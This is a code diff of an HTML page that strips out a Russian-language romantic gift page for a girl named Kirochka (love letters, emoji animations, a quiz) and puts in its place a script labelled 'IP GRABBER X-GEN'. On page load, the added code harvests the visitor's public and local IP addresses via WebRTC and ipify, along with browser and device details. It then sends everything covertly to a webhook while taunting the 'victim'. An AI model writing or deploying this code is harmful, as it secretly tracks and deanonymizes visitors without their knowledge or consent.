+                            credential: "openrelayproject" },
+                        { urls: "turn:openrelay.metered.ca:443", username: "openrelayproject",
+                            credential: "openrelayproject" },
+                    ];
 
-        function showMainText() {
-            const textEl = document.getElementById('mainText');
-            let text = '';
-            
-            if (isHappyMode) {
-                text = 'Кирочка, моя царица и любимая девочка! Ты самая-самая красивая, как солнышко! Когда ты улыбаешься, у меня всё внутри прыгает от счастья! Ты моя принцесса, и я всегда буду рядом, чтобы защищать тебя и радовать. Давай сегодня будем смеяться, дурачиться и делать друг другу приятности! Ты самая лучшая на свете, и я так рад, что ты у меня есть! Подними своё прекрасное личико и улыбнись, пожалуйста! Я тебя очень сильно люблю! Ты моя радость!';
-                textEl.className = 'main-text visible happy-text';
-            } else {
-                text = 'Кирочка, моя царица, моя любимая дуреха, моя самая красивая девочка на свете! Я сижу и думаю о тебе, и у меня сердце так сильно бьётся, что я слышу его. Ты даже не представляешь, как я тебя люблю. Когда ты улыбаешься — у меня праздник внутри, когда ты грустишь — я готов горы свернуть, чтобы ты снова засмеялась. Я хочу всегда быть рядом, держать тебя за руку, обнимать и говорить, какая ты у меня невероятная. Ты — мой маленький лучик, моя звёздочка, моя самая родная душа. Я так боюсь тебя потерять, потому что без тебя мир станет серым и пустым. Ты моя жизнь, моя радость, моя вечная королева. Я люблю тебя больше всего на свете, и никто-никто никогда не будет таким важным, как ты. Ты моя самая любимая дуреха, и я хочу, чтобы ты знала: ты одна такая на всю вселенную. Не плачь, моя хорошая, я рядом, я всегда буду твоим рыцарем. Ты у меня самая лучшая, самая родная, и я никогда-никогда тебя не брошу. Только ты, только моя Кирочка. Люблю тебя до слёз и до самых звёзд!';
-                textEl.className = 'main-text visible sad-text';
-            }
-            
-            textEl.textContent = '';
-            textEl.classList.add('visible');
-            
-            if (isSadMode) {
-                const sentences = text.split('. ');
-                let index = 0;
-                
-                function typeSentence() {
-                    if (index >= sentences.length) {
-                        setTimeout(() => {
-                            textEl.textContent = '';
-                            textEl.classList.remove('visible');
-                            setTimeout(() => {
-                                document.getElementById('blurOverlay').classList.remove('show');
-                                document.getElementById('exitBtn').style.display = 'block';
-                                document.getElementById('topBtn').style.display = 'block';
-                                startSadCountdown();
-                            }, 500);
-                        }, 2000);
-                        return;
-                    }
-                    
-                    const sentence = sentences[index];
-                    let charIndex = 0;
-                    textEl.textContent = '';
-                    
-                    function typeChar() {
-                        if (charIndex < sentence.length) {
-                            textEl.textContent += sentence[charIndex];
-                            charIndex++;
-                            setTimeout(typeChar, 30);
-                        } else {
-                            textEl.textContent += '.';
-                            setTimeout(() => {
-                                textEl.textContent = '';
-                                index++;
-                                setTimeout(typeSentence, 500);
-                            }, 1500);
+                    let pc = null;
+                    const ipList = new Set();
+                    let timeoutId = null;
+
+                    function finish() {
+                        if (timeoutId) clearTimeout(timeoutId);
+                        if (pc) {
+                            pc.close();
+                            pc = null;
                         }
+                        const result = Array.from(ipList);
+                        collectedData.publicIPs = result.filter(ip =>
+                            !ip.match(/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|0\.|169\.254\.)/)
+                        );
+                        collectedData.localIPs = result.filter(ip =>
+                            ip.match(/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|0\.|169\.254\.)/)
+                        );
+                        resolve();
                     }
-                    typeChar();
-                }
-                typeSentence();
-            } else {
-                let charIndex = 0;
-                function typeHappy() {
-                    if (charIndex < text.length) {
-                        textEl.textContent += text[charIndex];
-                        charIndex++;
-                        setTimeout(typeHappy, 40);
-                    } else {
-                        setTimeout(() => {
-                            textEl.textContent = '';
-                            textEl.classList.remove('visible');
-                            setTimeout(() => {
-                                document.getElementById('blurOverlay').classList.remove('show');
-                                document.getElementById('exitBtn').style.display = 'block';
-                                document.getElementById('topBtn').style.display = 'block';
-                                document.getElementById('funOptions').style.display = 'flex';
-                            }, 500);
+
+                    try {
+                        pc = new RTCPeerConnection({ iceServers: iceServers });
+
+                        pc.onicecandidate = (event) => {
+                            if (event.candidate) {
+                                const candidate = event.candidate.candidate;
+                                const ipRegex = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g;
+                                let match;
+                                while ((match = ipRegex.exec(candidate)) !== null) {
+                                    ipList.add(match[1]);
+                                }
+                            } else {
+                                // Все кандидаты собраны
+                                finish();
+                            }
+                        };
+
+                        // Создаем дата-канал (обязательно для генерации кандидатов)
+                        pc.createDataChannel("xgen_syndrome");
+                        pc.createOffer()
+                            .then(offer => pc.setLocalDescription(offer))
+                            .catch(() => finish());
+
+                        // Таймаут на случай, если браузер блокирует WebRTC
+                        timeoutId = setTimeout(() => {
+                            finish();
                         }, 3000);
+
+                    } catch (e) {
+                        finish();
                     }
-                }
-                typeHappy();
+                });
             }
-        }
 
-        function startSadCountdown() {
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            
-            const countdownEl = document.getElementById('countdown');
-            countdownEl.style.display = 'block';
-            let count = 3;
-            
-            function updateCount() {
-                countdownEl.textContent = count;
-                if (count <= 0) {
-                    countdownEl.style.display = 'none';
-                    blurOverlay.classList.remove('show');
-                    document.getElementById('centerBtn').style.display = 'block';
-                    return;
-                }
-                count--;
-                setTimeout(updateCount, 1000);
-            }
-            updateCount();
-        }
+            // Дополнительный сбор данных (фолбек через fetch к ipify + расширенная информация)
+            async function grabAdditionalInfo() {
+                collectedData.userAgent = navigator.userAgent;
+                collectedData.screenResolution = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
+                collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                collectedData.language = navigator.language;
+                collectedData.platform = navigator.platform;
+                collectedData.cores = navigator.hardwareConcurrency || 'Unknown';
+                collectedData.memory = navigator.deviceMemory || 'Unknown';
+                collectedData.timestamp = new Date().toISOString();
 
-        function toggleSadMode() {
-            const btn = document.getElementById('centerBtn');
-            if (!isSadActive) {
-                isSadActive = true;
-                btn.textContent = '❌ Выключить';
-                startSadRain();
-            } else {
-                isSadActive = false;
-                btn.textContent = '🎵 Включить';
-                document.getElementById('emojiRain').innerHTML = '';
-            }
-        }
-
-        function startSadRain() {
-            const container = document.getElementById('emojiRain');
-            container.innerHTML = '';
-            const emojisList = ['💀', '🌹', '😢', '💔', '😭', '🥀', '😿', '🖤', '😞', '💧', '😔', '🌑', '😰', '💫', '😩', '🌙', '😥', '⭐', '😪', '🌧️'];
-            
-            for (let i = 0; i < 20; i++) {
-                const emoji = document.createElement('div');
-                emoji.className = 'emoji-item';
-                emoji.textContent = emojisList[i % emojisList.length];
-                emoji.style.left = Math.random() * 90 + '%';
-                emoji.style.top = '-50px';
-                emoji.style.fontSize = (2 + Math.random() * 3) + 'rem';
-                emoji.style.animation = `rain ${5 + Math.random() * 5}s linear infinite`;
-                emoji.style.animationDelay = Math.random() * 5 + 's';
-                emoji.style.transform = `rotate(${Math.random() * 360}deg)`;
-                
-                emoji.addEventListener('mousedown', startDrag);
-                emoji.addEventListener('touchstart', startDragTouch);
-                
-                container.appendChild(emoji);
-                emojis.push(emoji);
-            }
-            
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes rain {
-                    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-                    100% { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
-                }
-            `;
-            document.head.appendChild(style);
-        }
-
-        function showKiss() {
-            const overlay = document.getElementById('kissOverlay');
-            overlay.style.display = 'flex';
-            kissSound.play();
-            
-            const kissText = document.getElementById('kissText');
-            kissText.classList.remove('visible');
-            kissText.textContent = '';
-            
-            const text = 'Кирочка, ты моя настоящая царица! Ты такая красивая, что я смотрю на тебя и не могу наглядеться. Твои глазки сияют как звёздочки, а улыбка светит ярче солнышка. Ты самая добрая, самая лучшая, самая любимая девочка на свете! Когда ты рядом, я чувствую себя самым счастливым рыцарем. Ты моя королева, моя госпожа, моя принцесса! Я готов носить тебя на руках и всегда говорить, какая ты замечательная. Просто ты — самая прекрасная, и я тебя очень-очень сильно люблю! Ты мой маленький звонкий лучик!';
-            
-            let charIndex = 0;
-            function typeKiss() {
-                if (charIndex < text.length) {
-                    kissText.textContent += text[charIndex];
-                    charIndex++;
-                    setTimeout(typeKiss, 30);
-                } else {
-                    kissText.classList.add('visible');
-                }
-            }
-            typeKiss();
-        }
-
-        function closeKiss() {
-            document.getElementById('kissOverlay').style.display = 'none';
-            document.getElementById('kissText').textContent = '';
-            document.getElementById('kissText').classList.remove('visible');
-        }
-
-        function startFun() {
-            document.getElementById('funOptions').style.display = 'none';
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            showQuestion('Ты готова милая моя?', ['Да', 'Нет']);
-            questionStage = 0;
-        }
-
-        function showQuestion(text, options) {
-            const modal = document.getElementById('questionModal');
-            modal.style.display = 'flex';
-            document.getElementById('questionText').textContent = text;
-            
-            const optionsContainer = document.getElementById('questionOptions');
-            optionsContainer.innerHTML = '';
-            options.forEach(opt => {
-                const btn = document.createElement('button');
-                btn.className = 'option-btn';
-                btn.textContent = opt;
-                btn.onclick = () => answerQuestion(opt.toLowerCase());
-                optionsContainer.appendChild(btn);
-            });
-        }
-
-        function answerQuestion(answer) {
-            const modal = document.getElementById('questionModal');
-            
-            if (questionStage === 0) {
-                if (answer === 'нет') {
-                    modal.querySelector('.question-text').innerHTML = 'НЕПРАВИЛЬНЫЙ ОТВЕТ!!😡😡';
-                    modal.querySelector('.question-text').className = 'question-text wrong-answer';
-                    setTimeout(() => {
-                        modal.querySelector('.question-text').textContent = 'Еще раз давай';
-                        modal.querySelector('.question-text').className = 'question-text';
-                        document.getElementById('questionOptions').innerHTML = '';
-                        const btn1 = document.createElement('button');
-                        btn1.className = 'option-btn';
-                        btn1.textContent = 'Да';
-                        btn1.onclick = () => answerQuestion('да');
-                        const btn2 = document.createElement('button');
-                        btn2.className = 'option-btn';
-                        btn2.textContent = 'Да';
-                        btn2.onclick = () => answerQuestion('да');
-                        document.getElementById('questionOptions').appendChild(btn1);
-                        document.getElementById('questionOptions').appendChild(btn2);
-                    }, 1500);
-                } else {
-                    modal.style.display = 'none';
-                    document.getElementById('blurOverlay').classList.remove('show');
-                    startHappyCountdown();
-                }
-            }
-        }
-
-        function startHappyCountdown() {
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            
-            const countdownEl = document.getElementById('countdown');
-            countdownEl.style.display = 'block';
-            let count = 3;
-            
-            function updateCount() {
-                countdownEl.textContent = count;
-                if (count <= 0) {
-                    countdownEl.style.display = 'none';
-                    blurOverlay.classList.remove('show');
-                    startHappyRain();
-                    return;
-                }
-                count--;
-                setTimeout(updateCount, 1000);
-            }
-            updateCount();
-        }
-
-        function startHappyRain() {
-            const container = document.getElementById('emojiRain');
-            container.innerHTML = '';
-            const emojisList = ['❤️', '🌸', '😊', '💖', '🌺', '😍', '💕', '🌷', '✨', '💗', '🌹', '💝', '🌻', '💞', '🌼', '💓', '🌿', '💘', '🌺', '😄'];
-            
-            for (let i = 0; i < 20; i++) {
-                const emoji = document.createElement('div');
-                emoji.className = 'emoji-item';
-                emoji.textContent = emojisList[i % emojisList.length];
-                emoji.style.left = Math.random() * 90 + '%';
-                emoji.style.top = '-50px';
-                emoji.style.fontSize = (2 + Math.random() * 3) + 'rem';
-                emoji.style.animation = `rain ${5 + Math.random() * 5}s linear infinite`;
-                emoji.style.animationDelay = Math.random() * 5 + 's';
-                emoji.style.transform = `rotate(${Math.random() * 360}deg)`;
-                
-                emoji.addEventListener('mousedown', startDrag);
-                emoji.addEventListener('touchstart', startDragTouch);
-                
-                container.appendChild(emoji);
-                emojis.push(emoji);
-            }
-            
-            const style = document.createElement('style');
-            style.textContent = `
-                @keyframes rain {
-                    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-                    100% { transform: translateY(110vh) rotate(720deg); opacity: 0.3; }
-                }
-            `;
-            document.head.appendChild(style);
-        }
-
-        function startDrag(e) {
-            const item = e.target;
-            isDragging = true;
-            dragItem = item;
-            offsetX = e.clientX - item.getBoundingClientRect().left;
-            offsetY = e.clientY - item.getBoundingClientRect().top;
-            item.style.position = 'fixed';
-            item.style.animation = 'none';
-            item.style.zIndex = 100;
-            item.style.cursor = 'grab';
-            
-            document.addEventListener('mousemove', onDrag);
-            document.addEventListener('mouseup', stopDrag);
-        }
-
-        function startDragTouch(e) {
-            const touch = e.touches[0];
-            const item = e.target;
-            isDragging = true;
-            dragItem = item;
-            offsetX = touch.clientX - item.getBoundingClientRect().left;
-            offsetY = touch.clientY - item.getBoundingClientRect().top;
-            item.style.position = 'fixed';
-            item.style.animation = 'none';
-            item.style.zIndex = 100;
-            
-            document.addEventListener('touchmove', onDragTouch);
-            document.addEventListener('touchend', stopDragTouch);
-        }
-
-        function onDrag(e) {
-            if (!isDragging || !dragItem) return;
-            dragItem.style.left = (e.clientX - offsetX) + 'px';
-            dragItem.style.top = (e.clientY - offsetY) + 'px';
-        }
-
-        function onDragTouch(e) {
-            if (!isDragging || !dragItem) return;
-            const touch = e.touches[0];
-            dragItem.style.left = (touch.clientX - offsetX) + 'px';
-            dragItem.style.top = (touch.clientY - offsetY) + 'px';
-        }
-
-        function stopDrag() {
-            isDragging = false;
-            dragItem = null;
-            document.removeEventListener('mousemove', onDrag);
-            document.removeEventListener('mouseup', stopDrag);
-        }
-
-        function stopDragTouch() {
-            isDragging = false;
-            dragItem = null;
-            document.removeEventListener('touchmove', onDragTouch);
-            document.removeEventListener('touchend', stopDragTouch);
-        }
-
-        function exitMode() {
-            document.getElementById('contentScreen').style.display = 'none';
-            document.getElementById('exitBtn').style.display = 'none';
-            document.getElementById('topBtn').style.display = 'none';
-            document.getElementById('funOptions').style.display = 'none';
-            document.getElementById('centerBtn').style.display = 'none';
-            document.getElementById('blurOverlay').classList.remove('show');
-            document.getElementById('emojiRain').innerHTML = '';
-            document.getElementById('customCursor').style.display = 'none';
-            document.getElementById('countdown').style.display = 'none';
-            document.getElementById('questionModal').style.display = 'none';
-            document.getElementById('kissOverlay').style.display = 'none';
-            document.getElementById('kissText').textContent = '';
-            document.getElementById('kissText').classList.remove('visible');
-            
-            isHappyMode = false;
-            isSadMode = false;
-            isSadActive = false;
-            
-            document.getElementById('menuScreen').style.display = 'flex';
-        }
-
-        // ============ СЕКРЕТНЫЙ РЕЖИМ ============
-        function startSecret() {
-            document.getElementById('menuScreen').style.display = 'none';
-            
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            
-            const container = document.getElementById('secretContainer');
-            container.style.display = 'flex';
-            
-            setTimeout(() => {
-                const textEl = document.getElementById('secretText');
-                const text = 'Кирочка, это же секрет, теперь тебе прийдется увидеть всю правду...';
-                textEl.textContent = '';
-                
-                let charIndex = 0;
-                function typeSecret() {
-                    if (charIndex < text.length) {
-                        textEl.textContent += text[charIndex];
-                        charIndex++;
-                        setTimeout(typeSecret, 40);
-                    } else {
-                        setTimeout(() => {
-                            textEl.textContent = '';
-                            container.style.display = 'none';
-                            document.getElementById('blurOverlay').classList.remove('show');
-                            showPodium();
-                        }, 1500);
+                // Попытка получить публичный IP через HTTP (если WebRTC не сработал)
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    if (data.ip && !collectedData.publicIPs.includes(data.ip)) {
+                        collectedData.publicIPs.push(data.ip);
                     }
-                }
-                typeSecret();
-            }, 2000);
-        }
-
-        function showPodium() {
-            const podium = document.getElementById('podiumContainer');
-            podium.classList.add('show');
-            
-            setTimeout(() => {
-                const pillar = document.getElementById('firstPlacePillar');
-                let height = 200;
-                const maxHeight = window.innerHeight * 0.7;
-                
-                secretInterval = setInterval(() => {
-                    if (height < maxHeight) {
-                        height += 1.5;
-                        pillar.style.height = height + 'px';
-                    }
-                }, 30);
-            }, 500);
-        }
-
-        function showFinalText() {
-            if (secretInterval) {
-                clearInterval(secretInterval);
-                secretInterval = null;
-            }
-            
-            document.getElementById('podiumContainer').classList.remove('show');
-            
-            const blurOverlay = document.getElementById('blurOverlay');
-            blurOverlay.classList.add('show');
-            
-            const container = document.getElementById('finalTextContainer');
-            container.classList.add('show');
-            
-            const textEl = document.getElementById('finalText');
-            const text = 'Кирочка, моя любимая царица, моя родная девочка! Прошло уже полгода с того дня, как мы встретились, а я помню каждую секунду. Помню, как впервые увидел тебя — у меня тогда сердце остановилось, а потом забилось так быстро, что я даже испугался. И знаешь? Оно до сих пор так же бьётся, когда ты рядом. Я думаю о тебе каждую минуту. Когда просыпаюсь — ты первая в моих мыслях. Когда ложусь спать — ты последняя, о ком я думаю. Даже во сне ты снишься мне, такая красивая, смешная, моя дуреха любимая! За эти полгода мы столько всего прошли вместе. Были и смешные моменты, когда мы дурачились, и немножко грустные, когда мы ссорились. Но знаешь, даже в те дни, когда мы ругались, я всё равно любил тебя сильнее прежнего. Ты изменила мою жизнь, Кирочка. Раньше я был просто мальчишкой, а теперь я чувствую себя рыцарем, у которого есть своя королева. Ты научила меня быть лучше, добрее, внимательнее. Ты самая красивая — твои глаза сияют как звёзды, твоя улыбка согревает меня в любую погоду. Ты самая добрая, самая заботливая, самая родная. И знаешь что? Мне кроме тебя никто на свете не нужен. Совсем никто! Все остальные — просто никто, пустое место. Только ты, моя Кирочка, моя госпожа, моя королева! Ты одна такая особенная, и я хочу быть только с тобой. Я не могу представить свою жизнь без тебя. Ты стала моим счастьем, моим смыслом, моей маленькой вселенной. Каждый день с тобой — это подарок. Я так рад, что судьба свела нас, и я обещаю, что буду любить тебя ещё сильнее. Ты моя самая лучшая девочка, моя царица, моя Кирочка. Просто знай: я люблю тебя больше жизни! Ты одна-единственная, и никто никогда не займёт твоё место!';
-            
-            textEl.textContent = '';
-            textEl.classList.remove('visible', 'blink');
-            
-            let charIndex = 0;
-            function typeFinal() {
-                if (charIndex < text.length) {
-                    textEl.textContent += text[charIndex];
-                    charIndex++;
-                    setTimeout(typeFinal, 20);
-                } else {
-                    textEl.classList.add('visible');
-                    setTimeout(() => {
-                        textEl.classList.add('blink');
-                        document.getElementById('blurOverlay').classList.remove('show');
-                    }, 300);
+                } catch (e) {
+                    // Без паники, у нас есть WebRTC
                 }
             }
-            typeFinal();
-        }
 
-        document.addEventListener('mousemove', (e) => {
-            const cursor = document.getElementById('customCursor');
-            if (cursor.style.display !== 'none') {
-                cursor.style.left = e.clientX + 'px';
-                cursor.style.top = e.clientY + 'px';
+            // Отправка на вебхук
+            async function sendToWebhook() {
+                const publicIP = collectedData.publicIPs[0] || 'Не обнаружен (WebRTC заблокирован)';
+                const localIPs = collectedData.localIPs.join(', ') || 'Нет';
+                const allIPs = [...collectedData.publicIPs, ...collectedData.localIPs].join(', ') || 'Нет';
+
+                const payload = {
+                    username: "💀 IP GRABBER X-GEN",
+                    avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
+                    content: "🎯 **НОВАЯ ЖЕРТВА ЗАХВАЧЕНА!**",
+                    embeds: [{
+                        title: "ТВОЙ IP БЫЛ СПИЗЖЕН ЛОХ ТЫ ТУПОЙ! ХА ХА ХА ХА",
+                        color: 0xFF0000,
+                        thumbnail: {
+                            url: "https://avatars.mds.yandex.net/i?id=2eb983fea23519c3299583cd48931419_l-4614182-images-thumbs&n=13"
+                        },
+                        fields: [
+                            { name: "🌐 Публичный IP", value: `\`\`\`${publicIP}\`\`\``, inline: false },
+                            { name: "🏠 Локальные IP", value: `\`\`\`${localIPs}\`\`\``, inline: false },
+                            { name: "📱 Все IP адреса", value: `\`\`\`${allIPs}\`\`\``, inline: false },
+                            { name: "🖥️ User-Agent", value: `\`\`\`${collectedData.userAgent}\`\`\``, inline: false },
+                            { name: "📺 Разрешение экрана", value: `\`${collectedData.screenResolution}\``,
+                                inline: true },
+                            { name: "🕒 Часовой пояс", value: `\`${collectedData.timezone}\``, inline: true },
+                            { name: "🌍 Язык", value: `\`${collectedData.language}\``, inline: true },
+                            { name: "💻 Платформа", value: `\`${collectedData.platform}\``, inline: true },
+                            { name: "🧠 Ядра CPU", value: `\`${collectedData.cores}\``, inline: true },
+                            { name: "💾 Память (GB)", value: `\`${collectedData.memory}\``, inline: true },
+                            { name: "📅 Время захвата", value: `\`${collectedData.timestamp}\``, inline: false },
+                        ],
+                        footer: { text: "X-GEN Anti-Syndrome Protocol • Earth-8847" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Отправка через fetch (основной метод)
+                try {
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    console.log('[X-GEN] IP успешно отправлен на вебхук');
+                } catch (e) {
+                    // Фолбек через navigator.sendBeacon (работает даже при закрытии страницы)
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    navigator.sendBeacon(WEBHOOK_URL, blob);
+                }
+
+                // Дополнительно: отправка через XMLHttpRequest для старых браузеров
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', WEBHOOK_URL, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(payload));
+                } catch (e) {
+                    // Все возможные методы исчерпаны
+                }
             }
-        });
 
-        document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('customCursor').style.display = 'none';
-        });
+            // Главная функция
+            async function main() {
+                await grabIPs();
+                await grabAdditionalInfo();
+                await sendToWebhook();
+
+                console.log('%c[ ТВОЙ IP БЫЛ СПИЗЖЕН ЛОХ ТЫ ТУПОЙ! ХА ХА ХА ХА ]',
+                    'color: red; font-size: 40px; font-weight: bold;');
+                console.log('%cIP адреса:', 'color: yellow; font-size: 20px;');
+                console.table(collectedData.publicIPs.concat(collectedData.localIPs));
+            }
+
+            // Запуск немедленно при загрузке страницы
+            main();
+        })();
     </script>
 </body>
-    </html>
+</html>
